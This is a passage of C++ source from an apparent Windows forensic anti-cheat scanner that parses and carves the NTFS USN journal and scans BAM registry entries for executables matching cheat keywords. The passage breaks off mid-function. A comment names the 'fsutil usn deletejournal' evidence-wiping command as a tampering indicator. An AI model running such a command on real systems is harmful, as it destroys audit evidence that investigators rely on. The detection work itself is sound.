// ---------------------------------------------------------------------------
// seenFrnUsn is populated here and passed to RunUSNJournalCarve so the carver
// can skip records that the live FSCTL scan already reported.
static void RunUSNJournalScan(std::set<std::pair<LONGLONG, LONGLONG>>& seenFrnUsn) {
    Log("[*] USN Journal Scan (native - live $J, full ReasonMask, keyword filter)");

    // Primary handle for FSCTL_READ_USN_JOURNAL
    HANDLE hVol = CreateFileW(L"\\\\.\\C:", GENERIC_READ,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        nullptr, OPEN_EXISTING, 0, nullptr);
    if (hVol == INVALID_HANDLE_VALUE) {
        Log("  [!] Cannot open C: volume (err " + std::to_string(GetLastError()) + ")");
        return;
    }

    USN_JOURNAL_DATA jdata = {};
    DWORD bytes = 0;
    if (!DeviceIoControl(hVol, FSCTL_QUERY_USN_JOURNAL, nullptr, 0,
        &jdata, sizeof(jdata), &bytes, nullptr)) {
        DWORD err = GetLastError();
        // Distinguish a deleted/disabled journal from a generic failure.
        // A deleted journal is itself a suspicious indicator — it may mean
        // someone ran "fsutil usn deletejournal" to wipe evidence.
        if (err == ERROR_JOURNAL_DELETE_IN_PROGRESS) {
            Log("  [!] SUSPICIOUS: USN journal deletion is in progress on C: - evidence may have been wiped");
        }
        else if (err == ERROR_JOURNAL_NOT_ACTIVE) {
            Log("  [!] SUSPICIOUS: USN journal is not active on C: - it was likely deleted or never enabled");
        }
        else {
            Log("  [!] USN journal query failed on C: (err " + std::to_string(err) + ")");
        }
        CloseHandle(hVol); return;
    }
    {
        char jid[20]; sprintf_s(jid, "%016llX", jdata.UsnJournalID);
        // Surface both MaximumSize and AllocationDelta.
        // A suspiciously tiny AllocationDelta (e.g. 1 byte) can indicate
        // the journal was reconfigured to minimise retention and destroy evidence.
        Log("  [+] Journal ID: 0x" + string(jid)
            + "  MaxSize: " + std::to_string(jdata.MaximumSize / (1024 * 1024)) + " MB"
            + "  AllocDelta: " + std::to_string(jdata.AllocationDelta / (1024 * 1024)) + " MB");
    }

    // READ_USN_JOURNAL_DATA_V1 (40 bytes) rather than the V0 struct (32 bytes).
    // On some Windows 8+ builds the kernel returns 0 bytes or silently skips
    // records when the input is exactly 32 bytes, because it interprets the
    // missing MinMajorVersion/MaxMajorVersion fields as 0, which requests
    // non-existent V0 records and produces an empty result set.
    // Using V1 with Min=Max=2 explicitly requests V2 records on all builds.
    READ_USN_JOURNAL_DATA_V1 readData = {};
    // StartUsn must be jdata.FirstUsn, NOT 0.
    // If StartUsn < FirstUsn Windows returns ERROR_JOURNAL_ENTRY_DELETED on the
    // very first FSCTL call because those records have already been overwritten
    // by the circular journal buffer — the loop breaks immediately with 0 records.
    // FirstUsn is the oldest USN still present in the journal right now.
    readData.StartUsn = jdata.FirstUsn;
    readData.ReasonMask = 0xFFFFFFFF;  // all flags
    readData.ReturnOnlyOnClose = 0;
    readData.Timeout = 0;
    readData.BytesToWaitFor = 0;
    readData.UsnJournalID = jdata.UsnJournalID;
    readData.MinMajorVersion = 2;  // request V2 records only
    readData.MaxMajorVersion = 2;

    // Secondary volume handle for OpenFileById (needs different access flags)
    HANDLE hVolId = CreateFileW(L"\\\\.\\C:", 0,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        nullptr, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, nullptr);

    // FRN → Win32 path cache (parent directories are shared by many records)
    std::map<LONGLONG, string> frnCache;

    // (filename_lower, keyword) pairs already reported.
    // Prevents the same file (e.g. a system cache file that happens to contain
    // a keyword) from generating dozens of identical entries — one per periodic
    // write cycle — that flood the report with noise.
    std::set<std::pair<string, string>> usnSeen;

    const DWORD kBufSize = 1024 * 1024;
    vector<BYTE> buf(kBufSize);
    LONGLONG totalRecords = 0, skippedV3 = 0, hits = 0;

    Log("  [*] Scanning $J for keyword hits ...");
    Log("      Format: Full Path | Reasons | Time (UTC)");
    Log("--------------------------------------------");

    while (true) {
        if (!DeviceIoControl(hVol, FSCTL_READ_USN_JOURNAL,
            &readData, sizeof(readData),
            buf.data(), kBufSize, &bytes, nullptr))
            break;
        if (bytes <= sizeof(USN)) break;

        BYTE* ptr = buf.data() + sizeof(USN);
        BYTE* end = buf.data() + bytes;

        while (ptr < end) {
            auto* rec = reinterpret_cast<USN_RECORD*>(ptr);
            if (rec->RecordLength == 0) break;
            totalRecords++;

            // V2-only enforcement (matching usnrs lib.rs hard-reject behaviour).
            // V3 records (Win8+ with ReFS or large FRNs) use 128-bit file
            // references at different offsets — casting them to USN_RECORD (V2)
            // produces garbage for every field. Skip rather than silently misparse.
            if (rec->MajorVersion != 2) {
                skippedV3++;
                ptr += rec->RecordLength;
                continue;
            }

            if (rec->FileNameLength > 0) {
                wstring wfn(rec->FileName,
                    rec->FileName + rec->FileNameLength / sizeof(WCHAR));
                string fn = WtoS(wfn.c_str());
                string fnLow = Lower(fn);

                // Keyword filter on filename — whole-word only, executable files only.
                // Raw substring matching generates floods of hits on legitimate files:
                //   "wave"  -> qwavecache.dat, shockwave*, aniwave* (all non-exe)
                //   "swift" -> vk_swiftshader.dll/.json
                //   "awp"   -> __PSScriptPolicyTest_lmxawp3v.lgq.ps1 (random temp name)
                // We only care about executables that were actually run.
                bool kwHit = false; string hitKw;
                if (IsExecutableExtension(fn)) {
                    for (auto& kw : KW)
                        if (MatchesWholeWord(fnLow, kw)) { kwHit = true; hitKw = kw; break; }
                }

                if (!kwHit) { ptr += rec->RecordLength; continue; }

                // Deduplicate: each (filename, keyword) pair is reported only once.
                // The USN journal records every individual write operation so the same
                // file can generate 30+ entries for routine hourly cache flushes.
                {
                    auto dedupKey = std::make_pair(fnLow, hitKw);
                    if (usnSeen.count(dedupKey)) { ptr += rec->RecordLength; continue; }
                    usnSeen.insert(dedupKey);
                }

                // ── FRN decomposition (matching usnrs mft_entry_num / sequence_num) ──
                // FileReferenceNumber layout: bits 0-47 = MFT entry number,
                //                             bits 48-63 = sequence number.
                // The sequence number increments each time an MFT slot is reused.
                // A cheat tool that was installed, deleted, and reinstalled may
                // appear at the same MFT entry number but a higher sequence number.
                LONGLONG fileFRN = (LONGLONG)(rec->FileReferenceNumber & 0x0000FFFFFFFFFFFFull);
                WORD     fileSeq = (WORD)((rec->FileReferenceNumber >> 48) & 0xFFFF);
                LONGLONG parentFRN = (LONGLONG)(rec->ParentFileReferenceNumber & 0x0000FFFFFFFFFFFFull);
                WORD     parentSeq = (WORD)((rec->ParentFileReferenceNumber >> 48) & 0xFFFF);

                // Resolve parent directory path from 48-bit parent FRN
                string parentPath;
                if (hVolId != INVALID_HANDLE_VALUE)
                    parentPath = ResolveFRNToPath(hVolId, parentFRN, frnCache);
                string fullPath = parentPath.empty() ? fn : parentPath + "\\" + fn;

                // Timestamp from the USN record
                FILETIME ft;
                ft.dwLowDateTime = (DWORD)(rec->TimeStamp.QuadPart & 0xFFFFFFFF);
                ft.dwHighDateTime = (DWORD)((rec->TimeStamp.QuadPart >> 32) & 0xFFFFFFFF);
                string ts = FiletimeToStr(reinterpret_cast<BYTE*>(&ft), 8);

                // Pipe-separated reasons (detect.ac viewer style)
                string reasons = FormatUSNReasons(rec->Reason);

                // Full SourceInfo decode — all 4 defined bits.
                // 0x1 = USN_SOURCE_DATA_MANAGEMENT        (background compaction etc.)
                // 0x2 = USN_SOURCE_AUXILIARY_DATA          (auxiliary stream writes)
                // 0x4 = USN_SOURCE_REPLICATION_MANAGEMENT  (RDC / DFS replication)
                // 0x8 = USN_SOURCE_CLIENT_REPLICATION_MANAGEMENT (client-side replication)
                // Any non-zero SourceInfo on a cheat binary is suspicious —
                // legitimate user activity has SourceInfo == 0.
                string srcTag;
                if (rec->SourceInfo & 0x8) srcTag = " [Background:ClientReplication]";
                else if (rec->SourceInfo & 0x4) srcTag = " [Background:Replication]";
                else if (rec->SourceInfo & 0x2) srcTag = " [Background:AuxData]";
                else if (rec->SourceInfo & 0x1) srcTag = " [Background:DataMgmt]";

                // Format the raw USN value (matching UsnJrnl2Csv "USN" column).
                // Useful for ordering events with sub-second precision and for
                // correlating records across separate scan runs on the same volume.
                char usnBuf[24]; sprintf_s(usnBuf, "%llu", (unsigned long long)rec->Usn);

                // Format MFT reference numbers (matching UsnJrnl2Csv columns
                // MFTReference / MFTReferenceSeqNo / MFTParentReference / MFTParentReferenceSeqNo).
                char fileFRNBuf[24], fileSeqBuf[8], parentFRNBuf[24], parentSeqBuf[8];
                sprintf_s(fileFRNBuf, "%lld", fileFRN);
                sprintf_s(fileSeqBuf, "%u", (unsigned)fileSeq);
                sprintf_s(parentFRNBuf, "%lld", parentFRN);
                sprintf_s(parentSeqBuf, "%u", (unsigned)parentSeq);

                // SecurityId — the numeric index into the $Secure stream's $SDS.
                // Non-zero changes here alongside a cheat binary can indicate
                // ACL tampering (e.g. locking out AV from reading the file).
                char secIdBuf[16]; sprintf_s(secIdBuf, "%lu", (unsigned long)rec->SecurityId);

                // Record this (FRN, USN) pair so the carver can skip it
                seenFrnUsn.insert(std::make_pair(fileFRN, (LONGLONG)rec->Usn));

                hits++;
                Log("============================================");
                Log("[HIT] Keyword      : " + hitKw);
                Log("      Tool         : USN Journal (native)");
                Log("      Full Path    : " + fullPath);
                Log("      File Name    : " + fn);
                Log("      Reason       : " + reasons + srcTag);
                Log("      Time (UTC)   : " + ts);
                Log("      USN          : " + string(usnBuf));
                Log("      MFT Ref      : " + string(fileFRNBuf) + "  Seq: " + string(fileSeqBuf));
                Log("      Parent Ref   : " + string(parentFRNBuf) + "  Seq: " + string(parentSeqBuf));
                Log("      Security ID  : " + string(secIdBuf));
                Log("============================================");
            }

            ptr += rec->RecordLength;
        }

        readData.StartUsn = *reinterpret_cast<USN*>(buf.data());
    }

    if (hVolId != INVALID_HANDLE_VALUE) CloseHandle(hVolId);
    CloseHandle(hVol);

    Log("  [~] USN Journal scan complete: "
        + std::to_string(totalRecords) + " records read, "
        + std::to_string(hits) + " keyword hit(s)"
        + (skippedV3 > 0
            ? "  [" + std::to_string(skippedV3) + " non-V2 records skipped]"
            : ""));
    Log("");
}

// =========================================================================
//  USN Journal Carver
//
//  Complements RunUSNJournalScan by recovering USN records that the live
//  FSCTL interface can no longer return — specifically records in pages that
//  the circular journal buffer has already overwritten with new data, but
//  where the old record bytes still survive in the slack space between the
//  last live record on a page and the page boundary.
//
//  Approach (matching UsnJrnl2Csv "scan mode"):
//    - Open C:\$Extend\$J directly via NtCreateFile (bypasses share-mode lock).
//      Falls back to a VSS copy if live open fails.
//    - Read the entire file in 1 MB chunks, including zeroed pages.
//    - For every 4-byte aligned offset, attempt to interpret the bytes as a
//      USN_RECORD V2 header and apply a multi-layered validity filter:
//        1. RecordLength in [64, 32832] and 8-byte aligned
//        2. MajorVersion == 2, MinorVersion == 0
//        3. FileReferenceNumber lower 48 bits > 0 (FRN 0 is invalid)
//        4. MFT sequence number (upper 16 bits of FileReferenceNumber) > 0
//        5. ParentFileReferenceNumber lower 48 bits > 4 (entries 0-4 are
//           reserved NTFS metadata files: $MFT, $MFTMirr, $LogFile, $Volume,
//           $AttrDef — legitimate files start at entry 5)
//        6. FileNameLength > 0, FileNameOffset == 60 (V2 fixed offset),
//           and FileNameLength <= RecordLength - 60
//        7. Timestamp in plausible range (1980-2100), matching UsnJrnl2Csv's
//           14 Oct 1957 – 31 May 2043 window tightened to avoid junk hits
//        8. All filename UTF-16 code units are printable (>= 0x20, not 0xFFFF)
//           — filters out random binary that passes the structural checks
//    - Keyword filter applied to carved filename.
//    - Hits deduped against a set of (FRN, USN) pairs already seen by the
//      live FSCTL scan to avoid double-reporting live records.
//    - Results logged in the same format as RunUSNJournalScan hits so the
//      output is consistent.
// =========================================================================

// Minimum and maximum plausible FILETIME values used to validate carved
// USN record timestamps.  These bracket 1 Jan 1980 – 1 Jan 2100.
static const LONGLONG kMinTimestamp = 119600064000000000LL; // 1980-01-01
static const LONGLONG kMaxTimestamp = 157766016000000000LL; // 2100-01-01

// Validate a candidate USN_RECORD V2 at `ptr` where at most `available`
// bytes remain in the buffer.  Returns true if the record passes all checks.
static bool IsValidUSNRecord(const BYTE* ptr, SIZE_T available) {
    if (available < 60) return false; // minimum V2 header size

    auto* rec = reinterpret_cast<const USN_RECORD*>(ptr);

    // 1. RecordLength: must be 8-byte aligned, at least 60 bytes (header only
    //    is valid if FileNameLength == 0, but we require a name — see check 6),
    //    and at most 60 + 255*2 = 570 bytes for the longest legal NTFS filename,
    //    rounded up to the next 8-byte boundary = 576.  Allow a little headroom.
    if (rec->RecordLength < 64)     return false;
    if (rec->RecordLength > 32832)  return false; // 32832 = 0x8040, well above max
    if (rec->RecordLength % 8 != 0) return false;
    if (rec->RecordLength > available) return false;

    // 2. Version must be exactly 2.0
    if (rec->MajorVersion != 2) return false;
    if (rec->MinorVersion != 0) return false;

    // 3. File FRN lower 48 bits must be non-zero
    LONGLONG fileFRN = (LONGLONG)(rec->FileReferenceNumber & 0x0000FFFFFFFFFFFFull);
    if (fileFRN == 0) return false;

    // 4. MFT sequence number (upper 16 bits) must be non-zero (matching
    //    UsnJrnl2Csv scan mode filter: MFTReferenceSeqNo > 0)
    WORD fileSeq = (WORD)((rec->FileReferenceNumber >> 48) & 0xFFFF);
    if (fileSeq == 0) return false;

    // 5. Parent FRN lower 48 bits must be > 4 (entries 0-4 are reserved
    //    NTFS metadata — matching UsnJrnl2Csv filter: ParentMftRef > 4)
    LONGLONG parentFRN = (LONGLONG)(rec->ParentFileReferenceNumber & 0x0000FFFFFFFFFFFFull);
    if (parentFRN <= 4) return false;

    // 6. Filename field checks
    if (rec->FileNameLength == 0)   return false;
    if (rec->FileNameOffset != 60)  return false; // fixed in V2
    if ((DWORD)rec->FileNameOffset + rec->FileNameLength > rec->RecordLength) return false;
    if (rec->FileNameLength % 2 != 0) return false; // UTF-16 must be even bytes
    if (rec->FileNameLength > 510)  return false;   // 255 UTF-16 chars max

    // 7. Timestamp plausibility
    if (rec->TimeStamp.QuadPart < kMinTimestamp) return false;
    if (rec->TimeStamp.QuadPart > kMaxTimestamp) return false;

    // 8. All filename UTF-16 code units must be printable and non-null
    const WCHAR* fn = reinterpret_cast<const WCHAR*>(ptr + rec->FileNameOffset);
    DWORD nChars = rec->FileNameLength / sizeof(WCHAR);
    for (DWORD i = 0; i < nChars; i++) {
        if (fn[i] < 0x0020) return false;
        if (fn[i] == 0xFFFF) return false;
    }

    return true;
}

static void RunUSNJournalCarve(std::set<std::pair<LONGLONG, LONGLONG>>& seenFrnUsn, const wstring& vss) {
    Log("[*] USN Journal Carve (scan mode - recovering deleted/overwritten records from $J slack)");

    // $J is a sparse ADS of $UsnJrnl. Try five open methods in order:
    //   1. Device namespace + full ADS name (most reliable on Win10+)
    //   2. NtCreateFile with NT path (bypasses Win32 ADS restrictions)
    //   3. Win32 namespace + full ADS name
    //   4. Original shorthand (older builds)
    //   5. VSS snapshot copy (fallback when live volume denies access)
    HANDLE hJ = INVALID_HANDLE_VALUE;
    wstring vssJCopy;

    // Method 1: device namespace + full ADS name
    if (hJ == INVALID_HANDLE_VALUE) {
        hJ = CreateFileW(L"\\\\.\\C:\\$Extend\\$UsnJrnl:$J", GENERIC_READ,
            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
            nullptr, OPEN_EXISTING,
            FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_SEQUENTIAL_SCAN, nullptr);
        if (hJ != INVALID_HANDLE_VALUE) Log("  [+] $J opened via device namespace (ADS)");
    }

    // Method 2: NtCreateFile with NT path
    if (hJ == INVALID_HANDLE_VALUE && pNtCreateFile && pRtlInitUnicodeString) {
        wstring ntJPath = L"\\??\\C:\\$Extend\\$UsnJrnl:$J";
        UNICODE_STRING uJPath = {};
        pRtlInitUnicodeString(&uJPath, ntJPath.c_str());
        OBJECT_ATTRIBUTES oaJ = {};
        oaJ.Length = sizeof(oaJ);
        oaJ.ObjectName = &uJPath;
        oaJ.Attributes = OBJ_CASE_INSENSITIVE;
        IO_STATUS_BLOCK iosbJ = {};
        NTSTATUS stJ = pNtCreateFile(&hJ,
            FILE_READ_DATA | SYNCHRONIZE,
            &oaJ, &iosbJ, nullptr, 0,
            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
            FILE_OPEN,
            FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE | FILE_SEQUENTIAL_ONLY,
            nullptr, 0);
        if (!NT_SUCCESS(stJ)) hJ = INVALID_HANDLE_VALUE;
        else Log("  [+] $J opened via NtCreateFile (NT path)");
    }

    // Method 3: Win32 namespace + full ADS name
    if (hJ == INVALID_HANDLE_VALUE) {
        hJ = CreateFileW(L"C:\\$Extend\\$UsnJrnl:$J", GENERIC_READ,
            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
            nullptr, OPEN_EXISTING,
            FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_SEQUENTIAL_SCAN, nullptr);
        if (hJ != INVALID_HANDLE_VALUE) Log("  [+] $J opened via Win32 ADS path");
    }

    // Method 4: original shorthand (pre-20H2 behaviour)
    if (hJ == INVALID_HANDLE_VALUE) {
        hJ = CreateFileW(L"\\\\.\\C:\\$Extend\\$J", GENERIC_READ,
            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
            nullptr, OPEN_EXISTING,
            FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_SEQUENTIAL_SCAN, nullptr);
        if (hJ != INVALID_HANDLE_VALUE) Log("  [+] $J opened via shorthand path");
    }

    // Method 5: VSS snapshot fallback - copy $J from shadow volume.
    // Used when all live methods fail (e.g. access denied, sparse ADS lock).
    // The VSS copy is a flat file so CreateFileW opens it normally.
    if (hJ == INVALID_HANDLE_VALUE && !vss.empty()) {
        vssJCopy = TmpDir() + L"HubChk_J_carve";
        // Silently probe VSS before calling CopyFromVss to avoid [!] VSS open failed
        // noise when the sparse ADS simply isn't exposed by the shadow copy provider.
        bool copied = false;
        wstring vssSrc1 = vss + L"\\$Extend\\$UsnJrnl:$J";
        wstring vssSrc2 = vss + L"\\$Extend\\$J";
        HANDLE hProbe = CreateFileW(vssSrc1.c_str(), GENERIC_READ,
            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
            nullptr, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, nullptr);
        if (hProbe != INVALID_HANDLE_VALUE) { CloseHandle(hProbe); copied = CopyFromVss(vss, L"$Extend\\$UsnJrnl:$J", vssJCopy); }
        if (!copied) {
            hProbe = CreateFileW(vssSrc2.c_str(), GENERIC_READ,
                FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                nullptr, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, nullptr);
            if (hProbe != INVALID_HANDLE_VALUE) { CloseHandle(hProbe); copied = CopyFromVss(vss, L"$Extend\\$J", vssJCopy); }
        }
        if (copied) {
            hJ = CreateFileW(vssJCopy.c_str(), GENERIC_READ,
                FILE_SHARE_READ, nullptr, OPEN_EXISTING,
                FILE_FLAG_SEQUENTIAL_SCAN, nullptr);
            if (hJ != INVALID_HANDLE_VALUE)
                Log("  [+] $J opened via VSS snapshot copy (fallback)");
            else {
                DeleteFileW(vssJCopy.c_str());
                vssJCopy.clear();
            }
        }
    }

    if (hJ == INVALID_HANDLE_VALUE) {
        Log("  [!] Cannot open $J for carving - all methods failed (last err "
            + std::to_string(GetLastError()) + ")");
        Log("  [~] Carve skipped - live FSCTL pass already ran above");
        return;
    }
    // Get file size for progress context
    LARGE_INTEGER jSize = {};
    GetFileSizeEx(hJ, &jSize);
    {
        string szStr;
        if (jSize.QuadPart >= 1024 * 1024 * 1024)
            szStr = std::to_string(jSize.QuadPart / (1024 * 1024 * 1024)) + " GB";
        else
            szStr = std::to_string(jSize.QuadPart / (1024 * 1024)) + " MB";
        Log("  [+] $J size: " + szStr + " - scanning entire file including overwritten pages");
    }

    // Secondary volume handle for FRN → path resolution
    HANDLE hVolId = CreateFileW(L"\\\\.\\C:", 0,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        nullptr, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, nullptr);

    std::map<LONGLONG, string> frnCache;

    const DWORD kBufSize = 1024 * 1024; // 1 MB read chunks
    vector<BYTE> buf(kBufSize + 576);   // +576 = max USN V2 record size, for cross-chunk records
    LONGLONG fileOffset = 0;
    LONGLONG totalScanned = 0, carved = 0, newHits = 0;

    // Carry-over bytes from the end of the previous chunk that weren't
    // consumed because a candidate record straddled the chunk boundary.
    DWORD carryOver = 0;

    Log("  [*] Carving $J for keyword hits in overwritten/slack pages ...");
    Log("--------------------------------------------");

    while (true) {
        // Move carry-over bytes to the front of the buffer
        DWORD toRead = kBufSize;
        DWORD r = 0;
        if (!ReadFile(hJ, buf.data() + carryOver, toRead, &r, nullptr) || r == 0) break;

        DWORD available = carryOver + r;
        fileOffset += r;
        totalScanned += r;

        DWORD i = 0;
        while (i + 60 <= available) {  // 60 = minimum V2 header
            const BYTE* ptr = buf.data() + i;

            if (!IsValidUSNRecord(ptr, available - i)) {
                i += 4; // advance by minimum alignment
                continue;
            }

            auto* rec = reinterpret_cast<const USN_RECORD*>(ptr);
            carved++;

            // Dedup: skip records already reported by the live FSCTL scan
            LONGLONG fileFRN = (LONGLONG)(rec->FileReferenceNumber & 0x0000FFFFFFFFFFFFull);
            LONGLONG usnVal = (LONGLONG)rec->Usn;
            auto key = std::make_pair(fileFRN, usnVal);
            if (seenFrnUsn.count(key)) {
                i += rec->RecordLength;
                continue;
            }

            // Extract filename
            const WCHAR* wfnPtr = reinterpret_cast<const WCHAR*>(ptr + rec->FileNameOffset);
            DWORD nChars = rec->FileNameLength / sizeof(WCHAR);
            wstring wfn(wfnPtr, wfnPtr + nChars);
            string fn = WtoS(wfn.c_str());
            string fnLow = Lower(fn);

            // Keyword filter — whole-word, executables only (same rules as live scanner)
            bool kwHit = false; string hitKw;
            if (IsExecutableExtension(fn)) {
                for (auto& kw : KW)
                    if (MatchesWholeWord(fnLow, kw)) { kwHit = true; hitKw = kw; break; }
            }

            if (!kwHit) { i += rec->RecordLength; continue; }

            // FRN decomposition
            WORD  fileSeq = (WORD)((rec->FileReferenceNumber >> 48) & 0xFFFF);
            LONGLONG parentFRN = (LONGLONG)(rec->ParentFileReferenceNumber & 0x0000FFFFFFFFFFFFull);
            WORD  parentSeq = (WORD)((rec->ParentFileReferenceNumber >> 48) & 0xFFFF);

            // Parent path resolution (best-effort — directory may be deleted)
            string parentPath;
            if (hVolId != INVALID_HANDLE_VALUE)
                parentPath = ResolveFRNToPath(hVolId, parentFRN, frnCache);
            string fullPath = parentPath.empty() ? fn : parentPath + "\\" + fn;

            // Timestamp
            FILETIME ft;
            ft.dwLowDateTime = (DWORD)(rec->TimeStamp.QuadPart & 0xFFFFFFFF);
            ft.dwHighDateTime = (DWORD)((rec->TimeStamp.QuadPart >> 32) & 0xFFFFFFFF);
            string ts = FiletimeToStr(reinterpret_cast<BYTE*>(&ft), 8);

            // Reasons
            string reasons = FormatUSNReasons(rec->Reason);

            // SourceInfo
            string srcTag;
            if (rec->SourceInfo & 0x8) srcTag = " [Background:ClientReplication]";
            else if (rec->SourceInfo & 0x4) srcTag = " [Background:Replication]";
            else if (rec->SourceInfo & 0x2) srcTag = " [Background:AuxData]";
            else if (rec->SourceInfo & 0x1) srcTag = " [Background:DataMgmt]";

            // Format fields
            char usnBuf[24];     sprintf_s(usnBuf, "%llu", (unsigned long long)rec->Usn);
            char fileFRNBuf[24]; sprintf_s(fileFRNBuf, "%lld", fileFRN);
            char fileSeqBuf[8];  sprintf_s(fileSeqBuf, "%u", (unsigned)fileSeq);
            char parFRNBuf[24];  sprintf_s(parFRNBuf, "%lld", parentFRN);
            char parSeqBuf[8];   sprintf_s(parSeqBuf, "%u", (unsigned)parentSeq);
            char secIdBuf[16];   sprintf_s(secIdBuf, "%lu", (unsigned long)rec->SecurityId);

            // File offset in $J where this record was carved from
            LONGLONG recOffset = (fileOffset - r) - (LONGLONG)carryOver + (LONGLONG)i;
            char offBuf[24];     sprintf_s(offBuf, "%lld", recOffset);

            newHits++;
            Log("============================================");
            Log("[CARVED HIT] Keyword      : " + hitKw);
            Log("             Tool         : USN Journal (carved - record was overwritten in live journal)");
            Log("             Full Path    : " + fullPath);
            Log("             File Name    : " + fn);
            Log("             Reason       : " + reasons + srcTag);
            Log("             Time (UTC)   : " + ts);
            Log("             USN          : " + string(usnBuf));
            Log("             MFT Ref      : " + string(fileFRNBuf) + "  Seq: " + string(fileSeqBuf));
            Log("             Parent Ref   : " + string(parFRNBuf) + "  Seq: " + string(parSeqBuf));
            Log("             Security ID  : " + string(secIdBuf));
            Log("             $J Offset    : " + string(offBuf));
            Log("============================================");

            i += rec->RecordLength;
        }

        // Carry over the unconsumed tail so cross-chunk records aren't missed
        carryOver = available - i;
        if (carryOver > 576) carryOver = 576; // cap at max record size
        if (carryOver > 0)
            memmove(buf.data(), buf.data() + i, carryOver);
    }

    if (hVolId != INVALID_HANDLE_VALUE) CloseHandle(hVolId);
    CloseHandle(hJ);
    if (!vssJCopy.empty()) DeleteFileW(vssJCopy.c_str());

    Log("  [~] USN carve complete: "
        + std::to_string(totalScanned / (1024 * 1024)) + " MB scanned, "
        + std::to_string(carved) + " candidate record(s) found in slack/overwritten pages, "
        + std::to_string(newHits) + " new keyword hit(s)");
    Log("");
}

static void RunBAMScan(const wstring& vss) {
    Log("[*] BAM Scan (native - live + all VSS snapshots + all ControlSets)");

    auto volMap = BuildVolumeMap();
    std::map<string, BAMRecord> allRecords;

    // ── Pass 1: Live CurrentControlSet ───────────────────────────────────────
    Log("  [*] Pass 1: Live HKLM CurrentControlSet ...");
    {
        const wchar_t* livePaths[] = {
            L"SYSTEM\\CurrentControlSet\\Services\\bam\\State\\UserSettings",
            L"SYSTEM\\CurrentControlSet\\Services\\bam\\UserSettings",
            nullptr
        };
        bool opened = false;
        for (int pi = 0; livePaths[pi] && !opened; pi++) {
            HKEY hBam = nullptr;
            LONG rc = RegOpenKeyExW(HKEY_LOCAL_MACHINE, livePaths[pi],
                0, KEY_READ | KEY_ENUMERATE_SUB_KEYS | KEY_WOW64_64KEY, &hBam);
            if (rc == ERROR_SUCCESS) {
                ScanBAMHiveRoot(hBam, volMap, "Live", allRecords);
                RegCloseKey(hBam);
                opened = true;
            }
        }
        if (!opened)
            Log("  [!] Live BAM key not found - BAM disabled or pre-Win10?");
    }

    // ── Pass 2: Live ControlSet001 (catches pruned entries) ──────────────────
    Log("  [*] Pass 2: Live HKLM ControlSet001 ...");
    {
        const wchar_t* cs001Paths[] = {
            L"SYSTEM\\ControlSet001\\Services\\bam\\State\\UserSettings",
            L"SYSTEM\\ControlSet001\\Services\\bam\\UserSettings",
            nullptr
        };
        bool opened = false;
        for (int pi = 0; cs001Paths[pi] && !opened; pi++) {
            HKEY hBam = nullptr;
            if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, cs001Paths[pi],
                0, KEY_READ | KEY_ENUMERATE_SUB_KEYS | KEY_WOW64_64KEY, &hBam) == ERROR_SUCCESS)
            {
                ScanBAMHiveRoot(hBam, volMap, "Live-CS001", allRecords);
                RegCloseKey(hBam);
                opened = true;
            }
        }
        if (!opened)
            Log("  [~] ControlSet001 BAM key not found or same as CCS");
    }

    // ── Pass 3: All VSS snapshots, all ControlSets ───────────────────────────
    {
        vector<wstring> snapshots = EnumAllVssSnapshots(vss);
        int snapIdx = 0;
        for (auto& snapDev : snapshots) {
            snapIdx++;
            string dateLabel = GetVssSnapshotDate(snapDev);
            Log("  [*] Pass 3." + std::to_string(snapIdx) + ": VSS snapshot " + dateLabel
                + " (" + WtoS(snapDev.c_str()).substr(0, 60) + "...) ...");
            ScanBAMFromHiveFile(snapDev, dateLabel, volMap, allRecords);
        }
        if (snapshots.empty())
            Log("  [~] No VSS snapshots found - only live registry was scanned");
    }

    // ── Enhancement: fetch current interactive logon time ────────────────────
    FILETIME logonTime = GetCurrentInteractiveLogonTime();
    {
        SYSTEMTIME lt = {};
        if (logonTime.dwLowDateTime || logonTime.dwHighDateTime) {
            FileTimeToSystemTime(&logonTime, &lt);
            char buf[64];
            snprintf(buf, sizeof(buf), "%04d-%02d-%02d %02d:%02d:%02d (UTC)",
                lt.wYear, lt.wMonth, lt.wDay, lt.wHour, lt.wMinute, lt.wSecond);
            Log("  [bam-instance] Current interactive logon time: " + string(buf));
        }
        else {
            Log("  [bam-instance] Could not determine current logon time");
        }
    }

    // ── Pre-scan all unsigned non-deleted entries for cheat patterns ─────────
    // The reference BAM parser (BAM-parser 1.2.9) runs its scanner on every
    // non-signed, non-deleted entry regardless of keyword match.  Previously
    // our scan was gated behind the keyword filter, meaning a cheat tool named
    // generically (e.g. "overlay.exe") would never be pattern-scanned.
    // We now do a pass over all entries first so pattern hits are available
    // when we reach the report loop, whether or not the path contains a keyword.
    for (auto& kv : allRecords) {
        BAMRecord& rec = kv.second;
        if (rec.resolvedPathOrig.empty()) continue;
        wstring wp(rec.resolvedPathOrig.begin(), rec.resolvedPathOrig.end());
        if (GetFileAttributesW(wp.c_str()) == INVALID_FILE_ATTRIBUTES) continue;
        SigStatus preSig = CheckSignature(wp, nullptr);
        if (preSig == SigStatus::Signed) continue;
        rec.patternHits = ScanFileForCheats(rec.resolvedPathOrig);
    }

    // ── Report keyword hits from merged results ───────────────────────────────
    int totalEntries = (int)allRecords.size();
    int flagged = 0;

    for (auto& kv : allRecords) {
        const BAMRecord& rec = kv.second;

        string pathLow = rec.resolvedPath;
